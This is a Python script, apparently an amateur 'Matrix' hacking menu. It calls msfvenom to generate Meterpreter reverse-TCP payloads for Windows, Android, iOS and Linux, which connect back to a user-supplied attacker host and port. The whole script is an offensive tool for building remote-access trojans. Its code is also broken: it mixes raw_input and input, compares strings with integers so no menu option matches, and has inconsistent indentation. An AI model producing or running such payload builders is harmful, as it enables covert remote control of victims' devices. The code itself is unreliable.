import os as matrix

import sys as n

import time as mm

from platform import system



W = '\033[0m'  # white (normal)

R = '\033[31m'  # red

G = '\033[32m'  # green

O = '\033[33m'  # orange

B = '\033[34m'  # blue

P = '\033[35m'  # purple

C = '\033[36m'  # cyan

GR = '\033[37m'  # gray





def clear():

    if system() == 'Linux':

        matrix.system("clear")

    if system() == 'Windows':

        matrix.system('cls')

        matrix.system('color a')

    else:

        pass





clear()





def slow(M):

    for c in M + '\n':

        n.stdout.write(c)

        n.stdout.flush()

        mm.sleep(2. / 100)





slow(R + '\t\t\t\t\n\n\n insta:d7_nn\t\t\t\tfb:matrix.gov')

print(B + '''

                         ___                                      

                        (   )                                     

 ___ .-. .-.     .---.   | |_      ___ .-.      .--.    ___  ___  

(   )   '   \   / .-, \ (   __)   (   )   \    /    \  (   )(   ) 

 |  .-.  .-. ; (__) ; |  | |       | ' .-. ;  |  .-. ;  | |  | |  

 | |  | |  | |   .'`  |  | | ___   |  / (___) |  | | |   \ `' /   

 | |  | |  | |  / .'| |  | |(   )  | |        |  |/  |   / ,. \   

 | |  | |  | | | /  | |  | | | |   | |        |  ' _.'  ' .  ; .  

 | |  | |  | | ; |  ; |  | ' | |   | |        |  .'.-.  | |  | |  

 | |  | |  | | ' `-'  |  ' `-' ;   | |        '  `-' /  | |  | |  

(___)(___)(___)`.__.'_.   `.__.   (___)        `.__.'  (___)(___)

''' + R)

slow(G+ '''

[1]}> meterpreter windows

[2]}> meterpreter android

[3]}> meterpreter appl_ios

[4]}> meterpreter  linux





[99]}> exit



''')

while True:

	

     numper = input("enter your numper>>>")

     

    

    



     if numper == 99:

        break









     elif numper == 1:

       LHOST = raw_input("enter the LHOST>>")

       LPORT = input ("enter the port>>")

       name = raw_input('name payload>>')

       matrix.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={}  -f exe -o/root/Desktop/{}.exe'.format(LHOST,LPORT,name)) 



       print('yes save Desktop 100')

     elif numper == 2:

       LHOST = raw_input("enter the LHOST>>")

       LPORT = input ("enter the port>>")

       name = raw_input('name payload>>')



       matrix.system('msfvenom -p android/meterpreter/reverse_tcp  LHOST={} LPORT={}   -o/root/Desktop/{}.apk'.format(LHOST,LPORT,name))



       print('yes save Desktop 100 Matrix')



     elif numper ==3:

      LHOST = raw_input("enter the LHOST>>")

      LPORT = input ("enter the port>>")

      name = raw_input('name payload>>')

      matrix.system('msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  -f macho  LHOST={} LPORT={}   -o/root/Desktop/{}.macho'.format(LHOST,LPORT,name))

     elif numper ==4:

      LHOST = raw_input("enter the LHOST>>")

      LPORT = input ("enter the port>>")

      name = raw_input('name payload>>')

      matrix.system('msfvenom -p linux/x86/meterpreter/reverse_tcp   -f elf  LHOST={} LPORT={}   -o/root/Desktop/{}.elf '.format(LHOST,LPORT,name))



    

     else:

		 print("NOT LHOST OR PORT FALSE",numper)

		 

		

        

    

    





    
